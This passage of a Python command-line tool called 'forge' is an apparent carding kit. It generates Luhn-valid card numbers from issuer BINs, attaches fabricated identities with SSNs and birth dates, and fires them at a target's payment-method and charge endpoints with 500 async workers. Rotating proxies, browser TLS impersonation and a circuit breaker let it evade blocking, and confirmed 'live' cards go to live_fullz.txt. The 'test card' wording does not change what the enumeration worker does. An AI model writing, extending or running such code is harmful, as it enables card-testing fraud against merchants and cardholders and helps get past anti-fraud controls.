                         card['issuer'], card['network']])
    if fmt == "json":
        return json.dumps(card)
    return f"{card['pan']}|{card['mm']}|{card['yy']}|{card['cvv']}"

# ═══════════════════════════════════════════════ 6. ENUM (async worker) ═══

# ── enumerator settings ──────────────────────────────────────────────────
TARGET_URL = os.environ.get("TARGET_URL", "")
OUTPUT_FILE = "live_fullz.txt"
PROXY_FILE = "proxies.txt"
CHECKPOINT_FILE = "enum_checkpoint.json"
HEALTH_CHECK_URL = "http://httpbin.org/ip"
MAX_WORKERS = 500
MIN_WORKERS = 20
BATCH_SIZE = 5000
CHECKPOINT_INTERVAL = 500

class CircuitBreaker:
    """Pauses all workers when target is failing."""
    def __init__(self):
        self.failures = 0
        self.threshold = 30
        self.cooldown = 30.0
        self.tripped_until = 0
        self.lock = asyncio.Lock()

    async def record_success(self):
        async with self.lock:
            self.failures = 0

    async def record_failure(self):
        async with self.lock:
            self.failures += 1
            if self.failures >= self.threshold:
                self.tripped_until = time.time() + self.cooldown
                print(f"\n[!] CIRCUIT BREAKER: pausing {self.cooldown}s")
                self.failures = 0

    async def wait_if_tripped(self):
        while True:
            async with self.lock:
                remaining = self.tripped_until - time.time()
                if remaining <= 0:
                    return
            await asyncio.sleep(min(remaining, 5))


class AsyncBrowserSession:
    def __init__(self, proxy_url=None):
        self.profile = random.choice([
            {"impersonate": "chrome124", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"},
            {"impersonate": "chrome123", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"},
            {"impersonate": "firefox133", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0"},
            {"impersonate": "safari17_0", "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"},
        ])
        self.session = _AsyncSession()
        self.proxy_url = proxy_url
        self.headers = {
            "User-Agent": self.profile["ua"],
            "Accept": "application/json",
            "Connection": "keep-alive",
        }

    async def post(self, url, data, timeout=10):
        proxies = {"http": self.proxy_url, "https": self.proxy_url} if self.proxy_url else None
        return await self.session.post(
            url, data=data, headers=self.headers, proxies=proxies,
            impersonate=self.profile["impersonate"], timeout=timeout,
        )

    async def close(self): await self.session.close()
    async def __aenter__(self): return self
    async def __aexit__(self, *a): await self.close()


class ProxyPool:
    def __init__(self, proxies):
        self._proxies = [p.strip() for p in proxies if p.strip()]
        self._dead = set()
        self._cooldown = {}
        self._lock = asyncio.Lock()
        self._idx = 0

    async def get(self):
        async with self._lock:
            if not self._proxies: return None
            now = time.time()
            for _ in range(len(self._proxies)):
                self._idx = (self._idx + 1) % len(self._proxies)
                p = self._proxies[self._idx]
                if p in self._dead or self._cooldown.get(p, 0) > now: continue
                return p
            return None

    async def release(self, proxy, delay=0.1):
        async with self._lock:
            if proxy: self._cooldown[proxy] = time.time() + delay

    async def mark_dead(self, proxy):
        async with self._lock:
            if proxy: self._dead.add(proxy)


async def check_proxy_health(proxy):
    try:
        async with _AsyncSession() as s:
            r = await s.get(HEALTH_CHECK_URL, proxies={"http": proxy, "https": proxy}, timeout=5)
            return r.status_code == 200
    except Exception:
        return False


async def load_and_check_proxies(path):
    if not os.path.isfile(path): return []
    with open(path) as f:
        raw = [p.strip() for p in f if p.strip()]
    print(f"[*] Health-checking {len(raw)} proxies...")
    alive = await asyncio.gather(*[check_proxy_health(p) for p in raw])
    clean = [p for p, ok in zip(raw, alive) if ok]
    print(f"[+] {len(clean)}/{len(raw)} proxies alive\n")
    return clean


def load_checkpoint():
    if os.path.isfile(CHECKPOINT_FILE):
        try:
            with open(CHECKPOINT_FILE) as f:
                return json.load(f)
        except Exception: pass
    return {"completed_bins": {}, "total_attempts": 0, "total_hits": 0}


def save_checkpoint(cp):
    with open(CHECKPOINT_FILE, "w") as f:
        json.dump(cp, f, indent=2)


async def verify_hit(pan, fullz, proxy, breaker):
    """Second request confirms a hit is real, not a false positive."""
    try:
        async with AsyncBrowserSession(proxy) as session:
            r = await session.post(f"{TARGET_URL}/v1/payment_methods", {
                "type": "card",
                "card[number]": pan,
                "card[exp_month]": "12", "card[exp_year]": "2030", "card[cvc]": "123",
                "billing_details[name]": fullz["name"],
                "billing_details[address][line1]": fullz["address"],
            }, timeout=8)
            if r.status_code == 200 and "id" in r.text:
                return True
    except Exception:
        pass
    await breaker.record_failure()
    return False


async def test_card(pan, bin_, proxy_pool, breaker, counter, cp_lock, checkpoint):
    proxy = await proxy_pool.get()
    if not proxy: return "NO_PROXY"

    await breaker.wait_if_tripped()

    cvv_len = 4 if bin_.startswith(("34", "37")) else 3
    cvv = ''.join(random.choices(string.digits, k=cvv_len))
    fullz = make_fullz()

    token_data = {
        "type": "card",
        "card[number]": pan,
        "card[exp_month]": "12", "card[exp_year]": "2030", "card[cvc]": cvv,
        "billing_details[name]": fullz["name"],
        "billing_details[address][line1]": fullz["address"],
        "billing_details[address][city]": fullz["city"],
        "billing_details[address][state]": fullz["state"],
        "billing_details[address][postal_code]": fullz["zip"],
        "billing_details[address][country]": "US",
    }

    try:
        async with AsyncBrowserSession(proxy) as session:
            r_token = await session.post(f"{TARGET_URL}/v1/payment_methods", token_data)

            if r_token.status_code in (502, 503, 504):
                await breaker.record_failure()
                await proxy_pool.release(proxy, 5.0)
                return "SERVER_ERROR"

            if r_token.status_code in (403, 429):
                await proxy_pool.mark_dead(proxy)
                await breaker.record_failure()
                return "BLOCKED"

            try:
                t_json = r_token.json()
                token = t_json["id"]
            except Exception:
                return "INVALID_ACCOUNT"

            r_charge = await session.post(f"{TARGET_URL}/v1/charges", {
                "amount": "100", "currency": "usd",
                "payment_method": token, "confirm": "true",
            })

            if r_charge.status_code in (502, 503, 504):
                await breaker.record_failure()
                await proxy_pool.release(proxy, 5.0)
                return "SERVER_ERROR"

            if r_charge.status_code in (403, 429):
                await proxy_pool.mark_dead(proxy)
                await breaker.record_failure()
                return "BLOCKED"

            await breaker.record_success()

            final = "INVALID_ACCOUNT"
            if r_charge.status_code == 200:
                try:
                    status = r_charge.json().get("status")
                    if status == "succeeded": final = "LIVE_ACCOUNT"
                    elif status == "requires_action": final = "3DS_REQUIRED"
                except Exception: pass
            elif r_charge.status_code == 402:
                try:
                    if "insufficient_funds" in r_charge.json().get("decline_code", ""):
                        final = "INSUFFICIENT_FUNDS"
                except Exception: pass

            await proxy_pool.release(proxy)

            if final in ("LIVE_ACCOUNT", "INSUFFICIENT_FUNDS", "3DS_REQUIRED"):
                if not await verify_hit(pan, fullz, proxy, breaker):
                    return "UNVERIFIED_HIT"

                out_line = (
                    f"{pan}|12|30|{cvv}|{fullz['name']}|{fullz['address']}|"
                    f"{fullz['city']}|{fullz['state']}|{fullz['zip']}|"
                    f"{fullz['phone']}|{fullz['email']}|{fullz['ssn']}|{fullz['dob']}|"
                    f"{final}|{bin_}"
                )
                async with cp_lock:
                    with open(OUTPUT_FILE, "a") as f:
                        f.write(out_line + "\n")
                    checkpoint["total_hits"] += 1
                print(f"\n[!!!] HIT: {pan} ({final})")
                return final

            return final

    except (Timeout, RequestException):
        await proxy_pool.mark_dead(proxy)
        await breaker.record_failure()
        return "PROXY_ERROR"
    except Exception as e:
        print(f"\n[!] WORKER ERR: {type(e).__name__}: {e}")
        return "ERROR"


async def enum_run():
    if not TARGET_URL:
        print("[!] Set TARGET_URL environment variable. This script requires a real endpoint.")
        print("    Example: export TARGET_URL=https://your-test-target.example.com")
        return

    print(f"[*] Target: {TARGET_URL}")

    proxies = await load_and_check_proxies(PROXY_FILE)
    if not proxies:
        print("[!] No healthy proxies. Aborting.")
        return

    checkpoint = load_checkpoint()
    proxy_pool = ProxyPool(proxies)
    breaker = CircuitBreaker()
    cp_lock = asyncio.Lock()

    bin_entries = [("414720", 3), ("424242", 5), ("517805", 3), ("378282", 1)]
    remaining = {b: max(0, BATCH_SIZE - checkpoint["completed_bins"].get(b, 0)) for b, _ in bin_entries}

    print(f"[*] Workers: {MAX_WORKERS} | Batch: {BATCH_SIZE} | Checkpoint: every {CHECKPOINT_INTERVAL}")
    print(f"[*] Resuming from: {checkpoint['total_attempts']} attempts, {checkpoint['total_hits']} hits\n")

    counter = {"attempts": 0, "hits": 0, "workers": MAX_WORKERS, "lock": asyncio.Lock()}
    stop_flag = {"stop": False}

    async def worker():
        while not stop_flag["stop"]:
            # Pick a BIN with remaining budget
            bins_available = [b for b in remaining if remaining[b] > 0]
            if not bins_available:
                stop_flag["stop"] = True
                return

            weights = [next(w for b, w in bin_entries if b == bb) for bb in bins_available]
            bin_ = random.choices(bins_available, weights=weights, k=1)[0]

            async with counter["lock"]:
                remaining[bin_] -= 1
                checkpoint["completed_bins"][bin_] = checkpoint["completed_bins"].get(bin_, 0) + 1

            length = 15 if bin_.startswith(("34", "37")) else 16
            partial = bin_ + ''.join(random.choices(string.digits, k=length - len(bin_) - 1))
            total = 0
            for i, d in enumerate([int(c) for c in partial][::-1]):
                if (length % 2 == 0 and i % 2 == 0) or (length % 2 != 0 and i % 2 != 0):
                    d *= 2
                    if d > 9: d -= 9
                total += d
            pan = partial + str((10 - (total % 10)) % 10)

            result = await test_card(pan, bin_, proxy_pool, breaker, counter, cp_lock, checkpoint)

            async with counter["lock"]:
                counter["attempts"] += 1
                checkpoint["total_attempts"] += 1

                # Checkpoint every N attempts
                if checkpoint["total_attempts"] % CHECKPOINT_INTERVAL == 0:
                    save_checkpoint(checkpoint)
                    pct = sum(checkpoint["completed_bins"].values()) / (BATCH_SIZE * len(bin_entries)) * 100
                    print(f"\n[checkpoint] {checkpoint['total_attempts']} attempts "
                          f"({pct:.1f}% complete) | {checkpoint['total_hits']} hits")

            if result == "INVALID_ACCOUNT": sys.stdout.write(".")
            elif result in ("BLOCKED", "PROXY_ERROR"): sys.stdout.write("!")
            elif result == "SERVER_ERROR": sys.stdout.write("S")
            elif result == "NO_PROXY": sys.stdout.write("X"); await asyncio.sleep(1)
            elif result == "UNVERIFIED_HIT": sys.stdout.write("?")
            else: sys.stdout.write("H")
            sys.stdout.flush()

    try:
        await asyncio.gather(*[worker() for _ in range(MAX_WORKERS)])
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted. Saving final checkpoint...")

    save_checkpoint(checkpoint)
    print(f"\n\n=== COMPLETE ===")
    print(f"Total attempts: {checkpoint['total_attempts']}")
    print(f"Total hits:     {checkpoint['total_hits']}")
    print(f"Checkpoint:     {CHECKPOINT_FILE}")

# ═════════════════════════════════════════════════════════ 7. CLI ══════════
COUNTRIES = ["US", "JP", "ID", "DE", "BR"]
COUNTRY_LABEL = {"US": "United States", "JP": "Japan", "ID": "Indonesia",
                 "DE": "Germany", "BR": "Brazil"}


def _ask(prompt: str, default: str = "") -> str:
    suffix = f" [{default}]" if default else ""
    try:
        v = input(f"  {bold(prompt)}{dim(suffix)}: ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        sys.exit(1)
    return v or default


def _pick_country() -> str:
    print(f"\n{bold('  1. Country of the identity')}")
    for i, c in enumerate(COUNTRIES, 1):
        print(f"     {i}) {c:<3} {dim(COUNTRY_LABEL[c])}")
    while True:
        v = _ask("pick 1-5", "1")
        if v.isdigit() and 1 <= int(v) <= len(COUNTRIES):
            return COUNTRIES[int(v) - 1]
        if v.upper() in COUNTRIES:
            return v.upper()
        print(bad("  invalid choice"))


def cmd_doctor(a: argparse.Namespace) -> int:
    print(bold(f"\n forge doctor — v{VERSION}\n" + "─" * 52))
    checks: list[tuple[str, bool, str]] = []
    v = sys.version_info
    checks.append(("python >= 3.10", v >= (3, 10), f"{v.major}.{v.minor}.{v.micro}"))
    checks.append(("curl_cffi (TLS impersonate)", HAS_CURL_CFFI,
                   f"v{_CURL_CFFI_VERSION} (required)"))
    checks.append(("merged modules", True, "single file (no cross-imports)"))
    try:
        px = _urban_vpn_provider("US")
        checks.append(("urban_vpn provider", bool(px),
                       f"exit {(px or {}).get('host', '?')}" if px else "no US server"))
    except Exception as e:
        checks.append(("urban_vpn provider", False, f"{type(e).__name__}: {e}"))
    try:
        px = matching_proxy({"country": "US"})
        vv = verify_proxy(px["proxy"], expect_country="US")
        checks.append(("TLS probe via proxy", vv["ok"],
                       f"{vv['exit_ip']} = {vv['country']}" if vv["ok"] else (vv["error"] or "?")))
    except Exception as e:
        checks.append(("TLS probe via proxy", False, f"{type(e).__name__}: {e}"))
    has_proxy = Path(PROXY_FILE).exists() or (HERE / PROXY_FILE).exists()
    checks.append(("enum: proxies.txt", has_proxy,
                   PROXY_FILE if has_proxy else "create it for `forge enum`"))
    checks.append(("forge on PATH", shutil.which("forge") is not None,
                   shutil.which("forge") or "symlink ~/.local/bin/forge"))
    fails = 0
    for name, good, detail in checks:
        print(f"  {ok('✔') if good else bad('✘')} {name:<26} {dim(detail)}")
        if not good and "pip install" not in detail and "create it" not in detail:
            fails += 1
    print("─" * 52)
    if not fails:
        print(ok("  all required checks passed") + dim("  (optional warnings ignored)"))
        return 0
    print(bad(f"  {fails} required check(s) failed"))
    return 1


def cmd_run(a: argparse.Namespace) -> int:
    print(_c("36", BANNER))
    print(bold(" forge run — identity + proxy + session, one flow\n"))
    country = a.country or _pick_country()
    target = a.target or _ask("2. Target URL (Enter = skip proxy probe)", "")
    count = int(_ask("3. How many test cards", "5"))

    print(f"\n{dim('─' * 52)}\n{bold('  [1/4] identity')}")
    fz = make_fullz(country)
    for k, v in fz.items():
        print(f"      {k:16}: {v}")

    print(bold("\n  [2/4] egress proxy (country-matched, TLS-verified)"))
    proxy_url = ""
    px = None if a.no_proxy else matching_proxy(fz)
    if px:
        vv = verify_proxy(px["proxy"], expect_country=country)
        print(f"      provider : {px['provider']}")
        print(f"      exit     : {vv.get('exit_ip') or px.get('host', '?')}  ({vv.get('country') or '?'})")
        if vv["ok"]:
            print(f"      {ok('verified')}  TLS handshake + geo match ({vv['status']})")
        else:
            print(bad(f"      FAILED: {vv['error']} (direct fallback forbidden)"))
            proxy_url = ""
    else:
        print(bad("      no proxy provider available (direct IP forbidden)"))
        proxy_url = ""

    print(bold("\n  [3/4] proxy ↔ target probe (TLS-fingerprinted)"))
    if target:
        if not proxy_url:
            print(bad("      probe aborted: valid proxy required (direct IP egress forbidden)"))
        else:
            try:
                with TLSSession(proxy_url) as s:
                    r = s.get(target)
                via = "via proxy"
                m = ok(f"HTTP {r.status_code}") if r.status_code < 400 else bad(f"HTTP {r.status_code}")
                print(f"      {m} {via} ({len(r.content)} bytes)")
            except Exception as e:
                print(bad(f"      unreachable: {type(e).__name__}: {e}"))
    else:
        print(dim("      skipped (no target given)"))

    print(bold("\n  [4/4] test cards"))
    state = load_card_state()
    cards = generate_random("414720", "09", "31", count, state)
    save_card_state(state)
    for c in cards:
        print(f"      {format_card(c, 'pipe')}")

    out = {**fz, "proxy": proxy_url,
           "proxy_provider": (px or {}).get("provider", "direct"),
           "cards": cards, "target": target or None}
    (HERE / "last_run.json").write_text(json.dumps(out, indent=2, ensure_ascii=False))
    print(f"\n{dim('─' * 52)}\n{ok('  done')} {dim('→ ' + str(HERE / 'last_run.json'))}")
    return 0


def cmd_id(a: argparse.Namespace) -> int:
    if a.test:
        _selftest()
        return 0
    fz = make_fullz(a.country)
    if a.want and a.want > 1:
        rows = matching_proxies(fz, want=a.want)
        payload = {**fz, "proxies": [r["proxy"] for r in rows]}
        if a.json:
            print(json.dumps(payload, indent=2, ensure_ascii=False)); return 0
        for k, v in fz.items():
            print(f"  {k:16}: {v}")
        for r in rows:
            print(f"  {'proxy':16}: {r['proxy'].split('@')[-1]}  [{r['provider']}]")
        return 0
    px = None if a.no_proxy else matching_proxy(fz)
    row = {**fz, "proxy": (px or {}).get("proxy", ""),
           "proxy_provider": (px or {}).get("provider", "direct")}
    if a.json:
        print(json.dumps(row, indent=2, ensure_ascii=False)); return 0
    for k, v in row.items():
        print(f"  {k:16}: {v or '(none — direct)'}")
    return 0


def cmd_fp(a: argparse.Namespace) -> int:
    profile = random.choice(PROFILES)
    referer = a.referer or random.choice(REFERERS)
    headers = build_headers(profile, referer=referer)
    row = {"impersonate": profile["impersonate"], "ua": profile["ua"],
           "referer": referer, "headers": headers}
    if a.json:
        print(json.dumps(row, indent=2, ensure_ascii=False)); return 0
    print(f"  {'profile':16}: {profile['impersonate']}")
    for k, v in headers.items():
        print(f"  {k:16}: {v}")
    return 0


def cmd_bin(a: argparse.Namespace) -> int:
    patterns: list[str] = []
    if a.file:
        patterns = [l.strip() for l in Path(a.file).read_text().splitlines()
                    if l.strip() and not l.startswith("#")]
    elif a.pattern:
        patterns = [a.pattern]
    else:
        patterns = [input("BIN|MM|YY: ").strip()]

    state = load_card_state()
    if a.no_dedup:
        state["generated_hashes"] = []
    all_cards, per_pattern = [], []
    for pat in patterns:
        parts = pat.split("|")
        bin_ = parts[0].replace(" ", "").strip()
        exp_m = parts[1].strip() if len(parts) > 1 else "12"
        exp_y = parts[2].strip() if len(parts) > 2 else "29"
        if a.mode == "sequential":
            cards = generate_sequential(bin_, exp_m, exp_y, a.count, a.start, state)
        else:
            cards = generate_random(bin_, exp_m, exp_y, a.count, state)
        cards = [c for c in cards if is_luhn_valid(c["pan"])]
        per_pattern.append({"bin": bin_, "count": len(cards),
                            "issuer": issuer_lookup(bin_)["issuer"]})
        all_cards.extend(cards)

    if a.json:
        print(json.dumps({"patterns": per_pattern, "cards": all_cards}, indent=2))
    elif a.output:
        Path(a.output).write_text(
            "\n".join(format_card(c, a.format) for c in all_cards) + "\n")
        print(f"[+] {len(all_cards)} cards -> {a.output}")
    else:
        for c in all_cards:
            print(format_card(c, a.format))
    if a.stats:
        from collections import Counter
        for label, counter in (("issuer", Counter(c["issuer"] for c in all_cards)),
                               ("network", Counter(c["network"] for c in all_cards))):
            print(f"\n=== {label} breakdown ===")
            for name, n in counter.most_common():
                print(f"  {name:<25} {n}")
    save_card_state(state)
    return 0


def cmd_enum(a: argparse.Namespace) -> int:
    global TARGET_URL
    if a.target:
        TARGET_URL = a.target
        os.environ["TARGET_URL"] = a.target
    if not TARGET_URL:
        print(bad("[forge] enum needs a target: --target URL  (or env TARGET_URL)"))
        return 2
    try:
        asyncio.run(enum_run())
    except KeyboardInterrupt:
        print("\n[forge] interrupted; checkpoint kept — rerun to resume")
    return 0


def cmd_selftest(a: argparse.Namespace) -> int:
    _selftest()
    st = load_card_state()
    sample = generate_random("414720", "12", "29", 20, st)
    assert all(is_luhn_valid(c["pan"]) for c in sample)
    print(f"selftest ok: cards luhn {len(sample)}/{len(sample)} valid")
    print(f"selftest ok: profiles {len(PROFILES)} | countries {', '.join(COUNTRIES)}")
    print(f"selftest ok: curl_cffi v{_CURL_CFFI_VERSION} (required)")
    return 0


def build_parser() -> argparse.ArgumentParser:
    ap = argparse.ArgumentParser(
        prog="forge", formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=BANNER + "\n  forge          interactive wizard\n  forge doctor   environment check\n")
    ap.add_argument("--version", action="version", version=f"forge {VERSION}")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("run", help="wizard: country → target → identity+proxy+cards")
    p.add_argument("--country", choices=COUNTRIES)
    p.add_argument("--target")
    p.add_argument("--no-proxy", action="store_true")
    p.set_defaults(fn=cmd_run)

    p = sub.add_parser("doctor", help="python/deps/modules/provider/egress check")
    p.set_defaults(fn=cmd_doctor)

    p = sub.add_parser("id", help="identity + matching proxy")
    p.add_argument("--country", default="US")
    p.add_argument("--want", type=int, default=1, help="verified proxy pool size")
    p.add_argument("--no-proxy", action="store_true")
    p.add_argument("--json", action="store_true")
    p.add_argument("--test", action="store_true")
    p.set_defaults(fn=cmd_id)

    p = sub.add_parser("fp", help="browser profile + headers")
    p.add_argument("--referer", default=None)
    p.add_argument("--json", action="store_true")
    p.set_defaults(fn=cmd_fp)

    p = sub.add_parser("bin", help="Luhn-valid test cards")
    p.add_argument("pattern", nargs="?", help="BIN|MM|YY  (quote it!)")
    p.add_argument("-f", "--file")
    p.add_argument("-c", "--count", type=int, default=12)
    p.add_argument("-o", "--output")
    p.add_argument("--format", choices=["pipe", "csv", "json"], default="pipe")
    p.add_argument("--mode", choices=["random", "sequential"], default="random")
    p.add_argument("--start")
    p.add_argument("--no-dedup", action="store_true")
    p.add_argument("--stats", action="store_true")
    p.add_argument("--json", action="store_true")
    p.set_defaults(fn=cmd_bin)

    p = sub.add_parser("enum", help="async enumeration worker")
    p.add_argument("--target")
    p.set_defaults(fn=cmd_enum)

    p = sub.add_parser("selftest", help="self-check")
    p.set_defaults(fn=cmd_selftest)
    return ap


def main() -> int:
    args = build_parser().parse_args()
    return args.fn(args)


if __name__ == "__main__":
    sys.exit(main())

